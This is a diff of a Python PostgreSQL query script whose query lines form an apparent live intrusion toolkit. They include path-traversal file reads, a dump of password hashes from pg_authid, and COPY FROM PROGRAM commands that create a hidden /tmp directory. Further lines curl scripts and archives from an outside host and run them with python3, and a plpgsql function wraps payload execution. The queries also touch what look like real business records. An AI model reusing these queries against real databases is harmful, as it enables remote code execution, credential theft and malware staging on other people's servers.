@@ -52,7 +52,8 @@ def query_database(query, pg8000_module, db_config):
         cursor.execute(query)
 
         # Handle SELECT queries
-        if query.strip().lower().startswith("select"):
+        #if query.strip().lower().startswith("show"):
+        if "select" in query.strip().lower():
             rows = cursor.fetchall()
             headers = [desc[0] for desc in cursor.description]
         else:
@@ -126,33 +127,42 @@ def generate_html_table(headers, rows):
 
 
 # Example usage of querying the database nas_v2
-# query = "SELECT datname FROM pg_database;"
+query = "SHOW password_encryption"
+#query = "SELECT datname FROM pg_database;"
 # query = "select * from pg_ls_dir('../../../../../home');"
 # query = "SELECT pg_read_file('../../../../../etc/mysql/my.cnf');"
-# query = "SELECT * FROM pg_available_extensions"
-# query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
+#query = "SELECT * FROM pg_available_extensions"
+#query = "SELECT rolname, rolpassword FROM pg_authid"
+#query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
 
 #query = "SELECT * FROM documents_document LIMIT 200 OFFSET 0;"
 # query = "SELECT * FROM documents_document WHERE application_data->>'business_name' ILIKE '%CHANDARANA%' LIMIT 200 OFFSET 0; "
-# query = "DROP TABLE IF EXISTS pg_cmd;"
-# query = "CREATE TABLE pg_cmd(cmd_output text);"
-# query = "TRUNCATE pg_cmd;"
-# query = "COPY pg_cmd FROM PROGRAM 'ls -lha ../../../../../';"
+#query = "DROP TABLE IF EXISTS pg_cmd_bb;"
+#query = "CREATE TABLE pg_cmd_bb(cmd_output text);"
+# query = "TRUNCATE pg_cmd_bb;"
+# query = "COPY pg_cmd_bb FROM PROGRAM 'ls -lha ../../../../../';"
 
-query = "SELECT * FROM pg_cmd;"
-#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'ls -lha ../../../../../tmp';"
-#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'mkdir ../../../../../tmp/.query-unix';"
+#query = "SELECT * FROM pg_cmd_bb;"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'ls -lha ../../../../../home/super/pgrouting-3.0.4/sql/components'; SELECT * FROM pg_cmd_bb;"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'cat ../../../../../home/super/.sudo_as_admin_successful'; SELECT * FROM pg_cmd_bb;"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'ls -lha ../../../../../tmp/.query-unix';"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'mkdir ../../../../../tmp/.query-unix';"
 
-#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/my_env_b.zip https://sbnke.com/my_env_bf.zip';"
-query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/master.py https://sbnke.com/py/master_b.py';"
-#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/unzip.py https://sbnke.com/py/u';"
-#query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/my_env_b.zip https://sbnke.com/my_env_bf.zip';"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/master.py https://sbnke.com/py/master_b.py';"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/unzip.py https://sbnke.com/py/unzip.py';"
+#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'python3 ../../../../../tmp/.query-unix/master.py';"
+
+
+#query = "SELECT proname, proargtypes, pronamespace::regnamespace, oid FROM pg_proc"
 
 # query = """
-# CREATE OR REPLACE FUNCTION pg_available_masters()
+# DROP FUNCTION IF EXISTS int99kv();
+# CREATE OR REPLACE FUNCTION int99kv()
 # RETURNS VOID AS $$
 # BEGIN
-#     COPY pg_cmd FROM PROGRAM 'curl dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun';
+#     COPY pg_cmd_bb FROM PROGRAM 'python3 ../../../../../tmp/.query-unix/master.py';
+#     TRUNCATE pg_cmd_bb;
 # END;
 # $$ LANGUAGE plpgsql;
 # """
